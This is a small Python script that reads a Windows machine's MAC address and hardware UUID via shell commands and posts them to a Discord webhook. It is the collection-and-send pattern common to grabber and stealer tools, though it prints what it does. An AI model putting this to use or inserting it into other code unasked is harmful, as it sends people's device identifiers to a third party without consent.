import requests
import subprocess
import re
from config import WEBHOOK_URL

def getmac():
    try:
        result = subprocess.check_output("getmac", shell=True).decode()
        mac = re.search(r"([0-9A-F]{2}[:-]){5}([0-9A-F]{2})", result)
        return mac.group(0) if mac else "Error: Could not retrieve MAC address"
    except Exception as e:
        return f"Error: {str(e)}"

def gethwid():
    try:
        result = subprocess.check_output("wmic csproduct get UUID", shell=True).decode().split('\n')
        hwid = result[1].strip()
        return hwid
    except Exception as e:
        return f"Error: Could not retrieve HWID"

mac = getmac()
hwid = gethwid()

msg = f"MAC Address: {mac}\nHardware ID: {hwid}"

requests.post(WEBHOOK_URL, json={'content': msg})

print("MAC Address and Hardware ID sent to Discord webhook.")
